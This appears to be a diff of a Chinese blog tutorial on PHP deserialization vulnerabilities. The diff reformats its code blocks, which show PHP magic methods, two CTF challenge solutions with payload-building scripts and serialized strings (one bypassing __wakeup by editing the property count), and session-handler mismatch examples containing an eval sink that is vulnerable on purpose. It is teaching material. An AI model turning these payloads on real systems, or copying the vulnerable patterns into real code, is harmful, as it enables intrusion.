 <li>该方法有两个参数，第一个参数 <code>$function_name</code> 会自动接收不存在的方法名，第二个 <code>$arguments</code> 则以数组的方式接收不存在方法的多个参数。</li>
 <li>格式 <code>function __call(string $function_name, array $arguments){   //...   }</code></li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $arguments)</span></span></span><br><span class="line"><span class="function">        </span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"你所调用的函数："</span> . $funName . <span class="string">"(参数："</span> ;  <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">            print_r($arguments); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">")不存在！&lt;br&gt;\n"</span>; <span class="comment">// 结束换行                      </span></span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> A(<span class="string">"Lethe"</span>);</span><br><span class="line">    $a-&gt;test(<span class="string">'no'</span>,<span class="string">'this'</span>,<span class="string">'function'</span>);  <span class="comment">//可以看到A类中并没有test()方法 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">你所调用的函数：test(参数：<span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; no</span><br><span class="line">    [<span class="number">1</span>] =&gt; this</span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">)</span></span><br><span class="line"><span class="function">)不存在！&lt;<span class="title">br</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><br></p>
+<pre><code class="php">&lt;?php
+    class A
+    {
+        private $test;
+
+        public function __construct($test)
+        {
+            $this-&gt;test = $test;
+        }
+        function __call($funName, $arguments)
+        { 
+            echo &quot;你所调用的函数：&quot; . $funName . &quot;(参数：&quot; ;  // 输出调用不存在的方法名
+            print_r($arguments); // 输出调用不存在的方法时的参数列表
+            echo &quot;)不存在！&lt;br&gt;\n&quot;; // 结束换行                      
+        }   
+    }
+    $a = new A(&quot;Lethe&quot;);
+    $a-&gt;test(&#39;no&#39;,&#39;this&#39;,&#39;function&#39;);  //可以看到A类中并没有test()方法 
+?&gt;
+</code></pre>
+<p>运行结果：</p>
+<pre><code>你所调用的函数：test(参数：Array
+(
+    [0] =&gt; no
+    [1] =&gt; this
+    [2] =&gt; function
+)
+)不存在！&lt;br&gt;
+</code></pre><p><br></p>
 <h3 id="0x04-反序列化漏洞分析"><a href="#0x04-反序列化漏洞分析" class="headerlink" title="0x04 反序列化漏洞分析"></a>0x04 反序列化漏洞分析</h3><p>说了这么多，下面就通过几个例子看看到底如何利用php反序列化进行攻击。</p>
-<h5 id="例1：全面考察的一题"><a href="#例1：全面考察的一题" class="headerlink" title="例1：全面考察的一题"></a>例1：全面考察的一题</h5><h6 id="（1）题目"><a href="#（1）题目" class="headerlink" title="（1）题目"></a>（1）题目</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"flag&#123;Here_1s_y0u_fl4g&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="例1：全面考察的一题"><a href="#例1：全面考察的一题" class="headerlink" title="例1：全面考察的一题"></a>例1：全面考察的一题</h5><h6 id="（1）题目"><a href="#（1）题目" class="headerlink" title="（1）题目"></a>（1）题目</h6><pre><code class="php">&lt;?php
+class start_gg
+{
+        public $mod1;
+        public $mod2;
+        public function __destruct()
+        {
+                $this-&gt;mod1-&gt;test1();
+        }
+}
+class Call
+{
+        public $mod1;
+        public $mod2;
+        public function test1()
+        {
+            $this-&gt;mod1-&gt;test2();
+        }
+}    
+class funct
+{
+        public $mod1;
+        public $mod2;
+        public function __call($test2,$arr)
+        {
+                $s1 = $this-&gt;mod1;
+                $s1();
+        }
+}
+class func
+{
+        public $mod1;
+        public $mod2;
+        public function __invoke()
+        {
+                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;
+        } 
+}
+class string1
+{
+        public $str1;
+        public $str2;
+        public function __toString()
+        {
+                $this-&gt;str1-&gt;get_flag();
+                return &quot;1&quot;;
+        }
+}
+class GetFlag
+{
+        public function get_flag()
+        {
+                echo &quot;flag:&quot;.&quot;flag{Here_1s_y0u_fl4g}&quot;;
+        }
+}
+$a = $_GET[&#39;string&#39;];
+unserialize($a);
+?&gt;
+</code></pre>
 <h6 id="（2）思路："><a href="#（2）思路：" class="headerlink" title="（2）思路："></a>（2）思路：</h6><ul>
 <li><p>要想获得输出flag，那么我们肯定要想办法调用<strong>GetFlag</strong>类的里的<code>get_flag()</code>方法。</p>
 </li>
@@ -330,7 +590,54 @@
 </li>
 <li>如何在每个类中实例化另一个类呢？可以利用类的构造函数，只要这个类被实例化，构造函数就自动实例化了你所需要的那个类。</li>
 </ul>
-<h6 id="（3）解答"><a href="#（3）解答" class="headerlink" title="（3）解答"></a>（3）解答</h6><p>思路清楚后就很容易了，脚本如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h6 id="（3）解答"><a href="#（3）解答" class="headerlink" title="（3）解答"></a>（3）解答</h6><p>思路清楚后就很容易了，脚本如下：</p>
+<pre><code class="php">&lt;?php
+class start_gg
+{
+        public $mod1;
+        public function __construct()
+        {
+            $this-&gt;mod1 = new Call();
+        }
+}
+class Call
+{
+        public $mod1;
+        public function __construct()
+        {
+            $this-&gt;mod1 = new funct();
+        }
+}
+class funct
+{
+        public $mod1;
+        public function __construct()
+        {
+            $this-&gt;mod1 = new func();
+        }
+}
+class func
+{
+        public $mod1;
+        public function __construct()
+        {
+            $this-&gt;mod1 = new string1();
+        }
+}
+class string1
+{
+        public $str1;
+        public function __construct()
+        {
+            $this-&gt;str1 = new GetFlag();
+        }
+}
+class GetFlag {}
+
+$a = new start_gg();
+echo serialize($a);
+?&gt;
+</code></pre>
 <p>输出结果：<br><code>O:8:&quot;start_gg&quot;:1:{s:4:&quot;mod1&quot;;O:4:&quot;Call&quot;:1:{s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:1:{s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:1:{s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:1:{s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:{}}}}}}</code></p>
 <p>题目是用Get传参进去，我这里直接将上述构造好的序列化字符串传进去，成功输出flag：</p>
 <p><img src="/2019/08/06/谈一谈PHP反序列化/20190806234240441.png" alt="在这里插入图片描述"></p>
@@ -338,7 +645,46 @@
 <h5 id="例2：第十二届全国大学生信息安全竞赛-JustSoso"><a href="#例2：第十二届全国大学生信息安全竞赛-JustSoso" class="headerlink" title="例2：第十二届全国大学生信息安全竞赛 JustSoso"></a>例2：第十二届全国大学生信息安全竞赛 JustSoso</h5><h6 id="（1）题目-1"><a href="#（1）题目-1" class="headerlink" title="（1）题目"></a>（1）题目</h6><p>本题要先用文件包含得到源码<code>index.php</code>和<code>hint.php</code>，在这里我就只讲关于反序列化的部分了。</p>
 <p><code>index.php</code>包含了<code>hint.php</code>，其中有<code>$payload = unserialize($payload);</code>进行了反序列化，而<code>$payload</code>是我们可控的参数。</p>
 <p><code>hint.php</code>源码如下:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;  </span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;  </span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;  </span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">//hint.php
+&lt;?php  
+class Handle{ 
+    private $handle;  
+    public function __wakeup(){  
+        foreach(get_object_vars($this) as $k =&gt; $v) {
+            $this-&gt;$k = null;
+        }
+        echo &quot;Waking up\n&quot;;
+    }
+    public function __construct($handle) {  
+        $this-&gt;handle = $handle; 
+    } 
+    public function __destruct(){  
+        $this-&gt;handle-&gt;getFlag();
+    }
+}
+
+class Flag{
+    public $file;
+    public $token;
+    public $token_flag;
+
+    function __construct($file){  
+        $this-&gt;file = $file;
+        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));
+    }
+
+    public function getFlag(){
+        $this-&gt;token_flag = md5(rand(1,10000));
+        if($this-&gt;token === $this-&gt;token_flag)
+        {
+            if(isset($this-&gt;file)){
+                echo @highlight_file($this-&gt;file,true); 
+            }  
+        }
+    }
+}
+?&gt;
+</code></pre>
 <h6 id="（2）思路"><a href="#（2）思路" class="headerlink" title="（2）思路"></a>（2）思路</h6><ul>
 <li>要想获取flag，明显要利用<strong>Flag</strong>类中<code>getFlag()</code>方法的<code>highlight_file()</code>函数将flag打印出来，因此需要将<code>$this-&gt;file</code>参数赋值为<code>flag.php</code>，所以就先找哪里调用了<code>getFlag()</code>方法。</li>
 <li>发现在<strong>Handle</strong>类的<code>__destruct()</code>方法中调用了，所以只需要将<code>$handle</code>实例化为<strong>Flag</strong>类的对象，然后创建<code>Handle</code>类的对象就行了，该对象销毁时就会自动调用<code>__destruct()</code>。</li>
@@ -348,7 +694,30 @@
 <p>前面我们介绍了序列化的格式，所以只需要在序列化字符串构造完成后，将属性的个数修改的比实际大就可以了。</p>
 <p>② 在你终于成功调用到了<code>getFlag()</code>方法后，还必须满足<code>$this-&gt;token === $this-&gt;token_flag</code>的验证，而<br><code>token_flag</code>是每次随机生成的，怎么样才能使<code>$token</code>和它相等呢？</p>
 <p>其实我们可以在构造的时候把<code>$token</code>声明为<code>$token_flag</code>的引用，如果不知道什么是引用，得好好补一下编程知识了，这样实际上<code>$token</code>与<code>$token_flag</code>就是同一个东西了，当然可以绕过验证。</p>
-<h6 id="（3）解答-1"><a href="#（3）解答-1" class="headerlink" title="（3）解答"></a>（3）解答</h6><p>构造脚本如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Flag($handle);	<span class="comment">//将handle声明为Flag类的对象，并将$handle作为参数传入</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;token =&amp; <span class="keyword">$this</span>-&gt;handle-&gt;token_flag;	<span class="comment">//将token声明为token_flag的引用</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123; </span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Handle(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h6 id="（3）解答-1"><a href="#（3）解答-1" class="headerlink" title="（3）解答"></a>（3）解答</h6><p>构造脚本如下：</p>
+<pre><code class="php">&lt;?php  
+class Handle{ 
+    private $handle;  
+    public function __construct($handle) {  
+        $this-&gt;handle = $handle; 
+        $this-&gt;handle = new Flag($handle);    //将handle声明为Flag类的对象，并将$handle作为参数传入
+        $this-&gt;handle-&gt;token =&amp; $this-&gt;handle-&gt;token_flag;    //将token声明为token_flag的引用
+    } 
+}
+class Flag{
+    public $file;
+    public $token;
+    public $token_flag;
+    function __construct($file){ 
+        $this-&gt;file = $file;
+    }
+
+}
+
+$a = new Handle(&#39;flag.php&#39;);
+echo serialize($a);
+?&gt;
+</code></pre>
 <p>输出结果：<br><code>O:6:&quot;Handle&quot;:1:{s:14:&quot; Handle handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}}</code></p>
 <p>当然要作为此题的payload，别忘了前面说的还要把序列化串中属性的个数由1改为2来绕过<code>__wakeup</code>的执行。</p>
 <p><br></p>
@@ -378,7 +747,15 @@
 </tbody>
 </table>
 <p><br></p>
-<p>即若设置如下Session:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    $passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $name;</span><br><span class="line">    $_SESSION[<span class="string">'passwd'</span>] = $passwd;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>即若设置如下Session:</p>
+<pre><code class="php">&lt;?php
+    session_start();
+    $name = $_GET[&#39;name&#39;];
+    $passwd = $_GET[&#39;passwd&#39;];
+    $_SESSION[&#39;name&#39;] = $name;
+    $_SESSION[&#39;passwd&#39;] = $passwd;
+?&gt;
+</code></pre>
 <p>当传入<code>name=lethe&amp;passwd=123</code>时，不同处理器对应的序列化字符串：结果如下:</p>
 <table>
 <thead>
@@ -406,23 +783,85 @@
 </table>
 <p><br></p>
 <p>问题就在，如果 PHP 在反序列化和序列化Session时使用不同的处理器，可能会导致数据无法正确反序列化，经过构造甚至可以执行代码。</p>
-<p>例子如下，有两个页面：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
